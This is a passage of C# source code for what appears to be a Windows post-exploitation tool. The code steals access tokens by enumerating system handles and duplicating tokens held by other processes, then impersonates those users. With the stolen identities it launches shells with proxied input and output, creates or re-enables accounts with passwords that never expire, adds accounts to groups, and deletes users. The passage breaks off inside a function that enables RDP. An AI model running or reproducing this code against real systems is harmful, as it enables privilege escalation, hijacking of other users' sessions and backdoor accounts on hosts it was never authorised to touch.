            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenElevationType, out tokenInfo, out dwLength))
            {
                num = Marshal.ReadInt32(tokenInfo);
                Marshal.FreeHGlobal(tokenInfo);

            }
            return (TOKEN_ELEVATION_TYPE)Enum.ToObject(typeof(TOKEN_ELEVATION_TYPE), num);
        }
        public static TokenImpersonationLevel GetImpersonationLevel(IntPtr tokenHandle)
        {
            IntPtr tokenInfo = IntPtr.Zero;
            uint dwLength = 0;
            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenImpersonationLevel, out tokenInfo, out dwLength))
            {
                int num = Marshal.ReadInt32(tokenInfo);
                Marshal.FreeHGlobal(tokenInfo);
                return num + TokenImpersonationLevel.Anonymous;
            }
            return TokenImpersonationLevel.None;
        }
        public static string GetAuthenticationType(IntPtr tokenHandle, out uint sessionId, out string logonDomain, out SECURITY_LOGON_TYPE logonType)
        {
            IntPtr tokenInfo = IntPtr.Zero;
            uint dwLength = 0;
            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenStatistics, out tokenInfo, out dwLength))
            {
                TOKEN_STATISTICS tokenStatistics = (TOKEN_STATISTICS)Marshal.PtrToStructure(tokenInfo, typeof(TOKEN_STATISTICS));
                Marshal.FreeHGlobal(tokenInfo);
                LUID logonAuthId = tokenStatistics.AuthenticationId;
                if (logonAuthId.LowPart == 998U)
                {
                    goto failRet;
                }
                IntPtr ppLogonSessionData = IntPtr.Zero;
                uint status = NativeMethod.LsaGetLogonSessionData(ref logonAuthId, ref ppLogonSessionData);
                if (status == NativeMethod.STATUS_SUCCESS)
                {
                    SECURITY_LOGON_SESSION_DATA sessionData = (SECURITY_LOGON_SESSION_DATA)Marshal.PtrToStructure(ppLogonSessionData, typeof(SECURITY_LOGON_SESSION_DATA));
                    string result = sessionData.AuthenticationPackage.ToString();
                    logonType = (SECURITY_LOGON_TYPE)sessionData.LogonType;
                    sessionId = sessionData.Session;
                    logonDomain = sessionData.LogonDomain.ToString();
                    NativeMethod.LsaFreeReturnBuffer(ppLogonSessionData);
                    return result;
                }

            }
        failRet:
            logonType = SECURITY_LOGON_TYPE.UndefinedLogonType;
            sessionId = 0;
            logonDomain = "UnKnown";
            return "UnKnown";
        }
        public static IntegrityLevel GetTokenIntegrityLevel(IntPtr tokenHanle)
        {
            IntPtr infoPtr = IntPtr.Zero;
            uint dwLength;
            uint IntegrityLevel = 0;
            if (NativeMethod.GetTokenInformation(tokenHanle, TOKEN_INFORMATION_CLASS.TokenIntegrityLevel, out infoPtr, out dwLength))
            {
                TOKEN_MANDATORY_LABEL tokenMandatoryLabel = (TOKEN_MANDATORY_LABEL)Marshal.PtrToStructure(infoPtr, typeof(TOKEN_MANDATORY_LABEL));
                IntPtr SubAuthorityCount = NativeMethod.GetSidSubAuthorityCount(tokenMandatoryLabel.Label.Sid);

                IntPtr IntegrityLevelRidPtr = NativeMethod.GetSidSubAuthority(tokenMandatoryLabel.Label.Sid, (uint)Marshal.ReadInt32(SubAuthorityCount) - 1);
                uint IntegrityLevelRid = (uint)Marshal.ReadInt32(IntegrityLevelRidPtr);
                Array integrityLevels = Enum.GetValues(typeof(IntegrityLevel));

                for (int i = 0; i < integrityLevels.Length; i++)
                {
                    uint tmpRid = (uint)integrityLevels.GetValue(i);
                    if (IntegrityLevelRid >= tmpRid)
                    {
                        IntegrityLevel = tmpRid;
                    }
                    else
                    {
                        break;
                    }
                }
                Marshal.FreeHGlobal(infoPtr);

            }
            return (IntegrityLevel)Enum.ToObject(typeof(IntegrityLevel), IntegrityLevel);
        }

        public static bool GetTokenUIAccess(IntPtr tokenHandle)
        {
            IntPtr tokenInfo = IntPtr.Zero;
            uint outLength = 0;
            bool isTokenUIAccess = false;
            if (NativeMethod.GetTokenInformation(tokenHandle, TOKEN_INFORMATION_CLASS.TokenUIAccess, out tokenInfo, out outLength))
            {
                if (Marshal.ReadByte(tokenInfo) != 0)
                {
                    isTokenUIAccess = true;
                }

                Marshal.FreeHGlobal(tokenInfo);
            }
            return isTokenUIAccess;
        }
        public bool CreateProcess(string commandLine, bool bInheritHandles, uint dwCreationFlags, ref STARTUPINFO startupinfo, out PROCESS_INFORMATION processInformation)
        {

            if (TokenType != TOKEN_TYPE.TokenPrimary)
            {
                IntPtr tmpTokenHandle = IntPtr.Zero;
                if (NativeMethod.DuplicateTokenEx(this.TokenHandle, NativeMethod.TOKEN_ELEVATION, IntPtr.Zero, this.ImpersonationLevel, TOKEN_TYPE.TokenPrimary,
                    out tmpTokenHandle))
                {
                    NativeMethod.CloseHandle(this.TokenHandle);
                    this.TokenHandle = tmpTokenHandle;
                }
                else
                {
                    throw new System.ComponentModel.Win32Exception(Marshal.GetLastWin32Error());
                }
            }

            NativeMethod.SetLastError(0);

            if (NativeMethod.CreateProcessAsUserW(this.TokenHandle, null, commandLine, IntPtr.Zero, IntPtr.Zero, bInheritHandles, dwCreationFlags
                    , IntPtr.Zero, null, ref startupinfo, out processInformation))
            {
                return true;
            }

            //The TokenHandle of CreateProcessWithTokenW must have TOKEN_ASSIGN_PRIMARY | TOKEN_DUPLICATE | TOKEN_QUERY | TOKEN_ADJUST_DEFAULT | TOKEN_ADJUST_SESSIONID permissions
            if ( NativeMethod.CreateProcessWithTokenW(this.TokenHandle, 0, null, commandLine, dwCreationFlags, IntPtr.Zero, null, ref startupinfo,
                    out processInformation))
            {
                return true;
            }
                else
                {
                    uint newDwCreationFlags = dwCreationFlags | (uint)ProcessCreateFlags.CREATE_SUSPENDED;
                    newDwCreationFlags |= (uint)ProcessCreateFlags.CREATE_UNICODE_ENVIRONMENT;
                    if (NativeMethod.CreateProcessW(null, commandLine, IntPtr.Zero, IntPtr.Zero, bInheritHandles, newDwCreationFlags, IntPtr.Zero, null, ref startupinfo, out processInformation))
                    {
                        //init PROCESS_ACCESS_TOKEN
                        uint PROCESS_ACCESS_TOKEN_SIZE = (uint)Marshal.SizeOf(typeof(PROCESS_ACCESS_TOKEN));
                        PROCESS_ACCESS_TOKEN processAccessToken = new PROCESS_ACCESS_TOKEN();
                        IntPtr tokenInfoPtr = Marshal.AllocHGlobal((int)PROCESS_ACCESS_TOKEN_SIZE);
                        processAccessToken.Token = this.TokenHandle;
                        processAccessToken.Thread = processInformation.hThread;
                        Marshal.StructureToPtr(processAccessToken, tokenInfoPtr, false);

                        uint status = NativeMethod.NtSetInformationProcess(processInformation.hProcess, PROCESS_INFORMATION_CLASS.ProcessAccessToken, tokenInfoPtr, PROCESS_ACCESS_TOKEN_SIZE);
                        Marshal.FreeHGlobal(tokenInfoPtr);
                        if (status == NativeMethod.STATUS_SUCCESS)
                        {

                            if ((dwCreationFlags & (uint)ProcessCreateFlags.PROFILE_USER) == 0)
                            {
                                if (NativeMethod.NtResumeProcess(processInformation.hProcess) != NativeMethod.STATUS_SUCCESS)
                                {
                                    NativeMethod.CloseHandle(processInformation.hThread);
                                    NativeMethod.CloseHandle(processInformation.hProcess);
                                    NativeMethod.NtTerminateProcess(processInformation.hProcess, 0);
                                    processInformation.hProcess = IntPtr.Zero;
                                    processInformation.hThread = IntPtr.Zero;
                                    return false;
                                }
                            }
                            return true;
                    }
                        else
                        {
                            NativeMethod.CloseHandle(processInformation.hThread);
                            NativeMethod.CloseHandle(processInformation.hProcess);
                            NativeMethod.NtTerminateProcess(processInformation.hProcess, 0);
                            processInformation.hProcess = IntPtr.Zero;
                            processInformation.hThread = IntPtr.Zero;
                        }
                    }
                }

            return false;


        }

        public void Close()
        {
            if (this.TokenHandle != IntPtr.Zero && !IsClose)
            {
                IsClose = true;
                NativeMethod.CloseHandle(this.TokenHandle);
                this.TokenHandle = IntPtr.Zero;
            }
        }

        public bool ImpersonateLoggedOnUser()
        {
            if (!IsClose && TokenHandle!= IntPtr.Zero)
            {
                return NativeMethod.ImpersonateLoggedOnUser(this.TokenHandle);
            }

            return false;
        }

    }

    [StructLayout(LayoutKind.Sequential, Pack = 1)]
    public struct SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX
    { // Information Class 64
        public IntPtr ObjectPointer;
        public IntPtr ProcessID;
        public IntPtr HandleValue;
        public uint GrantedAccess;
        public ushort CreatorBackTrackIndex;
        public ushort ObjectType;
        public uint HandleAttributes;
        public uint Reserved;
    }

    public class TokenuUils
    {
        private static readonly int tokenType = getTokenType();


        public static bool tryAddTokenPriv(IntPtr token, string privName)
        {
            TokenPrivileges tokenPrivileges = new TokenPrivileges();
            if (NativeMethod.LookupPrivilegeValue(null, privName, out tokenPrivileges.Luid))
            {

                tokenPrivileges.PrivilegeCount = 1;
                tokenPrivileges.Attributes = NativeMethod.SE_PRIVILEGE_ENABLED;
                int ReturnLength = 0;
                NativeMethod.SetLastError(0);
                NativeMethod.AdjustTokenPrivileges(token, false, tokenPrivileges, 0, IntPtr.Zero, out ReturnLength);
                if (Marshal.GetLastWin32Error() == NativeMethod.ERROR_SUCCESS)
                {
                    return true;
                }
            }
            return false;
        }
        public static SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX[] ListSystemHandle()
        {

            List<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX> result = new List<SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX>();
            uint handleInfoSize = 1024 * 1024;
            IntPtr handleInfoPtr = Marshal.AllocHGlobal((int)handleInfoSize);
            uint returnSize = 0;
            uint status = 0;
            while ((status = NativeMethod.NtQuerySystemInformation(NativeMethod.SystemExtendedHandleInformation, handleInfoPtr, handleInfoSize, out returnSize)) ==
                NativeMethod.STATUS_INFO_LENGTH_MISMATCH)
            {
                Marshal.FreeHGlobal(handleInfoPtr);
                handleInfoPtr = Marshal.AllocHGlobal(new IntPtr(handleInfoSize *= 2));
            }
            if (status != NativeMethod.STATUS_SUCCESS)
            {
                //Console.WriteLine("NtQuerySystemInformation ErrCode:" + Marshal.GetLastWin32Error());
                goto ret;
            }
            _SYSTEM_HANDLE_INFORMATION_EX handleInfo = (_SYSTEM_HANDLE_INFORMATION_EX)Marshal.PtrToStructure(handleInfoPtr, typeof(_SYSTEM_HANDLE_INFORMATION_EX));

            uint NumberOfHandles = handleInfo.GetNumberOfHandles();
            for (uint i = 0; i < NumberOfHandles; i++)
            {
                SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleEntry = _SYSTEM_HANDLE_INFORMATION_EX.HandleAt(handleInfoPtr, i);
                result.Add(handleEntry);
            }
        ret:
            Marshal.FreeHGlobal(handleInfoPtr);
            return result.ToArray();
        }
        public static int getTokenType()
        {
            int ret = -1;
            Process currentProcess = Process.GetCurrentProcess();
            WindowsIdentity windowsIdentity = WindowsIdentity.GetCurrent();
            IntPtr currentThreadToken = windowsIdentity.Token;
            SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX[] handles = TokenuUils.ListSystemHandle();
            for (int i = 0; i < handles.Length; i++)
            {
                SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleEntry = handles[i];
                if (handleEntry.ProcessID.ToInt64() == currentProcess.Id && currentThreadToken == handleEntry.HandleValue)
                {
                    ret = handleEntry.ObjectType;
                    goto ret;
                }
            }
        ret:
            windowsIdentity.Dispose();
            currentProcess.Dispose();
            return ret;
        }

        public delegate bool ListProcessTokensCallback(ProcessToken processToken);

        public static bool ListProcessTokensDefaultCallback(ProcessToken processToken)
        {
            return true;
        }

        public static ProcessToken[] ListProcessTokens(int targetPid, ListProcessTokensCallback listProcessTokensCallback)
        {
            SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX[] shteis = ListSystemHandle();
            List<ProcessToken> processTokens = new List<ProcessToken>();
            IntPtr localProcessHandle = NativeMethod.GetCurrentProcess();
            IntPtr processHandle = IntPtr.Zero;
            int lastPid = -1;
            for (int i = 0; i < shteis.Length; i++)
            {

                SYSTEM_HANDLE_TABLE_ENTRY_INFO_EX handleEntryInfo = shteis[i];
                int handleEntryPid = (int)handleEntryInfo.ProcessID.ToInt64();
                if (targetPid > 0 && handleEntryPid == targetPid //Filter process PID
                    || targetPid <= 0//If less than or equal to 0 do not filter
                    )
                {

                    if (lastPid != handleEntryPid)
                    {
                        if (processHandle != IntPtr.Zero)
                        {
                            NativeMethod.CloseHandle(processHandle);
                            processHandle = IntPtr.Zero;
                        }

                        processHandle = NativeMethod.OpenProcess(ProcessAccessFlags.DuplicateHandle | ProcessAccessFlags.QueryInformation, false, handleEntryPid);

                        if (processHandle != IntPtr.Zero)
                        {
                            IntPtr processToken = IntPtr.Zero;
                            if (NativeMethod.OpenProcessToken(processHandle, NativeMethod.TOKEN_ELEVATION, out processToken))
                            {
                                ProcessToken token = ProcessToken.Cast(IntPtr.Zero, handleEntryPid, processHandle, processToken);
                                if (token!=null)
                                {
                                    if (listProcessTokensCallback.Invoke(token))
                                    {
                                        PutToken(processTokens, token);
                                    }
                                    else
                                    {
                                        token.Close();
                                        goto end;
                                    }
                                }
                            }
                        }
                        lastPid = handleEntryPid;

                    }

                    if (processHandle == IntPtr.Zero)
                    {
                        continue;
                    }

                    //GrantedAccess 0x0012019f may cause congestion
                    if (handleEntryInfo.ObjectType != tokenType || handleEntryInfo.GrantedAccess == 0x0012019f)
                    {
                        continue;
                    }

                    IntPtr dupHandle = IntPtr.Zero;
                    if (NativeMethod.DuplicateHandle(processHandle, handleEntryInfo.HandleValue, localProcessHandle, out dupHandle,
                            NativeMethod.GENERIC_EXECUTE | NativeMethod.GENERIC_READ | NativeMethod.GENERIC_WRITE, false, 0))
                    {

                        ProcessToken token = ProcessToken.Cast(handleEntryInfo.HandleValue, handleEntryPid, processHandle, dupHandle);
                        if (token!=null)
                        {
                            if (listProcessTokensCallback.Invoke(token))
                            {
                                PutToken(processTokens, token);
                            }
                            else
                            {
                                token.Close();
                                goto end;
                            }
                        }
                    }


                    lastPid = handleEntryPid;
                }
            }

            end:
            if (processHandle != IntPtr.Zero)
            {
                NativeMethod.CloseHandle(processHandle);
            }
            NativeMethod.CloseHandle(localProcessHandle);
            return processTokens.ToArray();
        }
        private static void PutToken(List<ProcessToken> list, ProcessToken processToken)
        {

            if (processToken == null)
            {
                return;
            }


            for (int i = 0; i < list.Count; i++)
            {
                ProcessToken processTokenNode = list[i];
                if (processTokenNode.UserName == processToken.UserName)
                {
                    if (processToken.ImpersonationLevel > processTokenNode.ImpersonationLevel ||
                        (processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.ImpersonationLevel > processTokenNode.ImpersonationLevel && (processToken.TokenElevationType == TOKEN_ELEVATION_TYPE.TokenElevationTypeFull || processToken.IntegrityLevel > processTokenNode.IntegrityLevel)))
                    {
                        if (!processToken.IsRestricted)
                        {
                            processTokenNode.Close();
                            list[i] = processToken;
                        }
                    }
                    else
                    {
                        processToken.Close();
                    }
                    return;
                }
            }
            list.Add(processToken);

        }
    }


    static class Program
    {


        public static void listAllToken(TextWriter consoleWriter, int processId)
        {
            TokenuUils.ListProcessTokens(processId, processToken =>
            {
                consoleWriter.WriteLine("--------------------------------------");
                PropertyInfo[] memberInfo = typeof(ProcessToken).GetProperties();
                foreach (var item in memberInfo)
                {

                    consoleWriter.WriteLine($"FieldName: {item.Name}\tValue: {item.GetGetMethod().Invoke(processToken, new object[0])}");
                }
                consoleWriter.WriteLine("--------------------------------------");
                processToken.Close();
                return true;
            });
        }

        public static void listToken(TextWriter consoleWriter,int processId)
        {
            ProcessToken[] processTokens =  TokenuUils.ListProcessTokens(processId, TokenuUils.ListProcessTokensDefaultCallback);
            foreach (var processToken in processTokens)
            {
                consoleWriter.WriteLine("--------------------------------------");
                PropertyInfo[] memberInfo = typeof(ProcessToken).GetProperties();
                foreach (var item in memberInfo)
                {

                    consoleWriter.WriteLine($"FieldName: {item.Name}\tValue: {item.GetGetMethod().Invoke(processToken, new object[0])}");
                }
                consoleWriter.WriteLine("--------------------------------------");
                processToken.Close();
            }
        }

        public static void createProcessInteractive(TextWriter consoleWriter, TextReader consoleReader, string userName,string commandLine)
        {
            bool hasSeAssignPrimaryTokenPrivilege = false;
            ProcessToken[] processTokens = TokenuUils.ListProcessTokens(0, token =>
            {
                if (!hasSeAssignPrimaryTokenPrivilege && token.ImpersonationLevel >= TokenImpersonationLevel.Impersonation  && TokenuUils.tryAddTokenPriv(token.TokenHandle, "SeAssignPrimaryTokenPrivilege"))
                {
                    hasSeAssignPrimaryTokenPrivilege = token.ImpersonateLoggedOnUser();
                }
                return true;
            });

            foreach (var token in processTokens)
            {
                if (token.UserName == userName)
                {
                    IntPtr childProcessStdInRead = IntPtr.Zero;
                    IntPtr childProcessStdInWrite = IntPtr.Zero;
                    IntPtr childProcessStdOutRead = IntPtr.Zero; 
                    IntPtr childProcessStdOutWrite = IntPtr.Zero;

                    Thread proxyStdInThread = null;

                    FileStream childProcessReadStream = null;
                    FileStream childProcessWriteStream = null;

                    PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();

                    //Initialize security properties
                    SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();

                    securityAttributes.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
                    securityAttributes.pSecurityDescriptor = IntPtr.Zero;
                    securityAttributes.bInheritHandle = true;

                    //Initialize subprocess input and output
                    if (!NativeMethod.CreatePipe(out childProcessStdInRead, out childProcessStdInWrite,
                            ref securityAttributes, 8196))
                    {
                        goto end;
                    }

                    if (!NativeMethod.CreatePipe(out childProcessStdOutRead, out childProcessStdOutWrite,
                            ref securityAttributes, 8196))
                    {
                        goto end;
                    }


                    STARTUPINFO startupInfo = new STARTUPINFO();
                    startupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFO));
                    startupInfo.hStdError = childProcessStdOutWrite;
                    startupInfo.hStdOutput = childProcessStdOutWrite;
                    startupInfo.hStdInput = childProcessStdInRead;
                    startupInfo.dwFlags = (int)NativeMethod.STARTF_USESTDHANDLES;

                    NativeMethod.SetHandleInformation(childProcessStdInRead, NativeMethod.HANDLE_FLAG_INHERIT, NativeMethod.HANDLE_FLAG_INHERIT);
                    NativeMethod.SetHandleInformation(childProcessStdInWrite, NativeMethod.HANDLE_FLAG_INHERIT, NativeMethod.HANDLE_FLAG_INHERIT);
                    NativeMethod.SetHandleInformation(childProcessStdOutRead, NativeMethod.HANDLE_FLAG_INHERIT, NativeMethod.HANDLE_FLAG_INHERIT);
                    NativeMethod.SetHandleInformation(childProcessStdOutWrite, NativeMethod.HANDLE_FLAG_INHERIT, NativeMethod.HANDLE_FLAG_INHERIT);

                   

                    if (token.CreateProcess(commandLine, true, (uint)ProcessCreateFlags.CREATE_NO_WINDOW, ref startupInfo,
                            out processInformation))
                    {
                        consoleWriter.WriteLine($"[*] process start with pid {processInformation.dwProcessId}");

                        NativeMethod.CloseHandle(childProcessStdInRead);
                        childProcessStdInRead = IntPtr.Zero;
                        NativeMethod.CloseHandle(childProcessStdOutWrite);
                        childProcessStdOutWrite = IntPtr.Zero;

                        childProcessReadStream = new FileStream(childProcessStdOutRead, FileAccess.Read, false);
                        childProcessWriteStream = new FileStream(childProcessStdInWrite, FileAccess.Write, false);

                        byte[] readBytes = new byte[4096];
                        uint bytesAvail = 0;
                        uint BytesLeftThisMessage = 0;
                        uint bytesRead = 0;
                        int read = 0;

                        proxyStdInThread = new Thread(() =>
                        {
                            char[] readBytes2 = new char[1024];
                            int read2 = 0;
                            try
                            {
                                while (true)
                                {
                                    if ((read2 = consoleReader.Read(readBytes2, 0, readBytes2.Length))>0)
                                    {
                                        byte[] convertBuf = Encoding.Default.GetBytes(readBytes2, 0, read2);
                                        childProcessWriteStream.Write(convertBuf, 0, convertBuf.Length);
                                        childProcessWriteStream.Flush();
                                    }
                                    Thread.Sleep(80);
                                }
                            }
                            catch (Exception e)
                            {

                            }
                        });

                        proxyStdInThread.IsBackground = true;
                        proxyStdInThread.Start();

                        while (true)
                        {
                            if (!NativeMethod.PeekNamedPipe(childProcessStdOutRead, readBytes, (uint)readBytes.Length,
                                ref bytesRead, ref bytesAvail, ref BytesLeftThisMessage))
                            {
                                break;
                            }

                            if (bytesAvail>0)
                            {
                                read = childProcessReadStream.Read(readBytes, 0, readBytes.Length);
                                consoleWriter.Write(Encoding.Default.GetChars(readBytes,0,read));
                            }

                            Thread.Sleep(80);

                        }


                    }
                    else
                    {
                        consoleWriter.WriteLine($"[!] Cannot create process Win32Error:{Marshal.GetLastWin32Error()}");
                    }

                    end:
                    if (proxyStdInThread != null)
                    {
                        if (proxyStdInThread.IsAlive)
                        {
                            proxyStdInThread.Abort();

                        }
                    }
                    if (childProcessReadStream != null)
                    {
                        childProcessReadStream.Close();
                    }
                    if (childProcessWriteStream != null)
                    {
                        childProcessWriteStream.Close();
                    }
                    if (processInformation.hProcess!=IntPtr.Zero)
                    {
                        NativeMethod.CloseHandle(processInformation.hProcess);
                    }
                    if (processInformation.hThread != IntPtr.Zero)
                    {
                        NativeMethod.CloseHandle(processInformation.hThread);
                    }
                    if (childProcessStdInRead != IntPtr.Zero)
                    {
                        NativeMethod.CloseHandle(childProcessStdInRead);
                    }
                    if (childProcessStdInWrite != IntPtr.Zero)
                    {
                        NativeMethod.CloseHandle(childProcessStdInWrite);
                    }
                    if (childProcessStdOutRead != IntPtr.Zero)
                    {
                        NativeMethod.CloseHandle(childProcessStdOutRead);
                    }
                    if (childProcessStdOutWrite != IntPtr.Zero)
                    {
                        NativeMethod.CloseHandle(childProcessStdOutWrite);
                    }

                    break;
                }
            }


            foreach (var token in processTokens)
            {
                token.Close();
            }
        }
        public static void createProcessReadOut(TextWriter consoleWriter, string userName, string commandLine)
        {
            bool hasSeAssignPrimaryTokenPrivilege = false;
            ProcessToken[] processTokens = TokenuUils.ListProcessTokens(0, token =>
            {
                if (!hasSeAssignPrimaryTokenPrivilege && token.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && TokenuUils.tryAddTokenPriv(token.TokenHandle, "SeAssignPrimaryTokenPrivilege"))
                {
                    hasSeAssignPrimaryTokenPrivilege = token.ImpersonateLoggedOnUser();
                }
                return true;
            });

            foreach (var token in processTokens)
            {
                if (token.UserName == userName)
                {
                    IntPtr childProcessStdOutRead = IntPtr.Zero;
                    IntPtr childProcessStdOutWrite = IntPtr.Zero;

                    FileStream childProcessReadStream = null;

                    PROCESS_INFORMATION processInformation = new PROCESS_INFORMATION();

                    //Initialize security properties
                    SECURITY_ATTRIBUTES securityAttributes = new SECURITY_ATTRIBUTES();

                    securityAttributes.nLength = Marshal.SizeOf(typeof(SECURITY_ATTRIBUTES));
                    securityAttributes.pSecurityDescriptor = IntPtr.Zero;
                    securityAttributes.bInheritHandle = true;

                    //Initialize subprocess output

                    if (!NativeMethod.CreatePipe(out childProcessStdOutRead, out childProcessStdOutWrite,
                            ref securityAttributes, 8196))
                    {
                        goto end;
                    }


                    STARTUPINFO startupInfo = new STARTUPINFO();
                    startupInfo.cb = Marshal.SizeOf(typeof(STARTUPINFO));
                    startupInfo.hStdError = childProcessStdOutWrite;
                    startupInfo.hStdOutput = childProcessStdOutWrite;
                    startupInfo.hStdInput = IntPtr.Zero;
                    startupInfo.dwFlags = (int)NativeMethod.STARTF_USESTDHANDLES;

                    NativeMethod.SetHandleInformation(childProcessStdOutRead, NativeMethod.HANDLE_FLAG_INHERIT, NativeMethod.HANDLE_FLAG_INHERIT);
                    NativeMethod.SetHandleInformation(childProcessStdOutWrite, NativeMethod.HANDLE_FLAG_INHERIT, NativeMethod.HANDLE_FLAG_INHERIT);



                    if (token.CreateProcess(commandLine, true, (uint)ProcessCreateFlags.CREATE_NO_WINDOW, ref startupInfo,
                            out processInformation))
                    {
                        consoleWriter.WriteLine($"[*] process start with pid {processInformation.dwProcessId}");

                        NativeMethod.CloseHandle(childProcessStdOutWrite);
                        childProcessStdOutWrite = IntPtr.Zero;

                        childProcessReadStream = new FileStream(childProcessStdOutRead, FileAccess.Read, false);

                        byte[] readBytes = new byte[4096];
                        uint bytesAvail = 0;
                        uint BytesLeftThisMessage = 0;
                        uint bytesRead = 0;
                        int read = 0;

                        while (true)
                        {
                            if (!NativeMethod.PeekNamedPipe(childProcessStdOutRead, readBytes, (uint)readBytes.Length,
                                ref bytesRead, ref bytesAvail, ref BytesLeftThisMessage))
                            {
                                break;
                            }

                            if (bytesAvail > 0)
                            {
                                read = childProcessReadStream.Read(readBytes, 0, readBytes.Length);
                                consoleWriter.Write(Encoding.Default.GetChars(readBytes, 0, read));
                            }
                            Thread.Sleep(80);
                        }


                    }
                    else
                    {
                        consoleWriter.WriteLine($"[!] Cannot create process Win32Error:{Marshal.GetLastWin32Error()}");
                    }

                end:
                if (childProcessReadStream != null)
                    {
                        childProcessReadStream.Close();
                    }
                if (processInformation.hProcess != IntPtr.Zero)
                    {
                        NativeMethod.CloseHandle(processInformation.hProcess);
                    }
                    if (processInformation.hThread != IntPtr.Zero)
                    {
                        NativeMethod.CloseHandle(processInformation.hThread);
                    }
                    if (childProcessStdOutRead != IntPtr.Zero)
                    {
                        NativeMethod.CloseHandle(childProcessStdOutRead);
                    }
                    if (childProcessStdOutWrite != IntPtr.Zero)
                    {
                        NativeMethod.CloseHandle(childProcessStdOutWrite);
                    }

                    break;
                }
            }


            foreach (var token in processTokens)
            {
                token.Close();
            }
        }

        public static void addUser(TextWriter consoleWriter, string domain, string userName, string passWord, string group) {
            bool isOK = false;
            TokenuUils.ListProcessTokens(0, processToken =>
            {
                if (processToken.UserName != "NT AUTHORITY\\ANONYMOUS LOGON" && processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.ImpersonateLoggedOnUser())
                {
                    try
                    {
                        using (DirectoryEntry dir = new DirectoryEntry(domain))
                        {
                            using (DirectoryEntry user = dir.Children.Add(userName, "User")) //add username
                            {
                                user.Properties["FullName"].Add(userName); //full user name
                                user.Invoke("SetPassword", passWord); //user password
                                user.Invoke("Put", "Description", userName);//Detailed user description
                                //user.Invoke("Put","PasswordExpired",1); //The user needs to change the password next time he logs in
                                user.Invoke("Put", "UserFlags", 66049); //password never expires
                                //user.Invoke("Put", "UserFlags", 0x0040);//User cannot change password
                                user.CommitChanges();//save user
                                using (DirectoryEntry grp = dir.Children.Find(group, "group"))
                                {
                                    if (grp.Name != "")
                                    {
                                        grp.Invoke("Add", user.Path.ToString());//add user to a group
                                    }
                                    grp.CommitChanges();
                                }
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        NativeMethod.RevertToSelf();
                        processToken.Close();
                        return true;
                    }
                }
                else
                {
                    processToken.Close();
                    return true;
                }
                isOK = true;
                NativeMethod.RevertToSelf();
                processToken.Close();
                return false;
            });

            if (isOK)
            {
                consoleWriter.WriteLine("[*] add user Successful!");
            }
            else
            {
                consoleWriter.WriteLine("[!] add user Fail!");
            }
        }
        public static void enableUser(TextWriter consoleWriter,string domain, string userName, string passWord,string group)
        {
            bool isOK = false;
            TokenuUils.ListProcessTokens(0, processToken =>
            {
                if (processToken.UserName != "NT AUTHORITY\\ANONYMOUS LOGON" && processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.ImpersonateLoggedOnUser())
                {
                    try
                    {
                        using (DirectoryEntry dir = new DirectoryEntry(domain))
                        {
                            using (DirectoryEntry user = dir.Children.Find(userName, "User")) //find username
                            {
                                user.Invoke("SetPassword", passWord); //user password
                                user.InvokeSet("UserFlags", 66049); //password never expires
                                user.InvokeSet( "AccountDisabled", false); //activate account
                                user.CommitChanges();//save user

                                if (group!=null && group.Length > 0)
                                {
                                    using (DirectoryEntry grp = dir.Children.Find(group, "group"))
                                    {
                                        bool isExist = false;
                                        object members = grp.Invoke("Members", null);
                                        foreach (object member in (IEnumerable)members)
                                        {
                                            DirectoryEntry x = new DirectoryEntry(member);
                                            if (x.Name == userName)
                                            {
                                                isExist = true;
                                                break;
                                            }
                                        }
                                        if (grp.Name != "" && !isExist)
                                        {
                                            grp.Invoke("Add", user.Path.ToString());//add user to a group
                                        }
                                        grp.CommitChanges();
                                    }
                                }
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        NativeMethod.RevertToSelf();
                        processToken.Close();
                        return true;
                    }
                }
                else
                {
                    processToken.Close();
                    return true;
                }
                isOK = true;
                NativeMethod.RevertToSelf();
                processToken.Close();
                return false;
            });

            if (isOK)
            {
                consoleWriter.WriteLine("[*] enable user Successful!");
            }
            else
            {
                consoleWriter.WriteLine("[!] enable user Fail!");
            }
        }
        public static void deleteUser(TextWriter consoleWriter, string domain,string userName)
        {
            bool isOK = false;
            TokenuUils.ListProcessTokens(0, processToken =>
            {
                if (processToken.UserName != "NT AUTHORITY\\ANONYMOUS LOGON" && processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.ImpersonateLoggedOnUser())
                {
                    try
                    {
                        using (DirectoryEntry dir = new DirectoryEntry(domain))
                        {
                            using (DirectoryEntry user = dir.Children.Find(userName, "User"))
                            {
                                dir.Children.Remove(user);
                            }
                        }
                    }
                    catch (Exception e)
                    {
                        NativeMethod.RevertToSelf();
                        processToken.Close();
                        return true;
                    }
                }
                else
                {
                    processToken.Close();
                    return true;
                }
                isOK = true;
                NativeMethod.RevertToSelf();
                processToken.Close();
                return false;
            });

            if (isOK)
            {
                consoleWriter.WriteLine("[*] delete user Successful!");
            }
            else
            {
                consoleWriter.WriteLine("[!] delete user Fail!");
            }
        }
        public static void enableRDP(TextWriter consoleWriter) {

            bool isOK = false;
            int rdpPort = 3389;
            TokenuUils.ListProcessTokens(0, processToken =>
            {
                if (processToken.UserName != "NT AUTHORITY\\ANONYMOUS LOGON" && processToken.ImpersonationLevel >= TokenImpersonationLevel.Impersonation && processToken.ImpersonateLoggedOnUser())
                {
                    try
                    {
                        ManagementObject win32TerminalServiceSetting = null;
